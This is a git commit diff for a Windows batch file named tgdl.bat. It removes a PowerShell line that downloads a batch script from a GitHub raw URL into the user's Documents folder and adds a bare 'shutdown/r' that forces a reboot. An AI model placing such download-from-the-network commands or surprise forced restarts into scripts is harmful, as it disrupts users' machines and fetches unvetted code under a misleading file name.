6afa674ed8fa8fbfe1f96c382f76365c4f7c529a
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-25 14:19:00 +0330

    Update tgdl.bat

--- tgdl.bat
+++ tgdl.bat
@@ -1,2 +1,1 @@
-PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://raw.githubusercontent.com/neginsadeghi2005/project/refs/heads/main/game.bat' , ('C:\Users\' + $env:USERPROFILE + '\Documents\tg.bat'))"
-	
+shutdown/r	
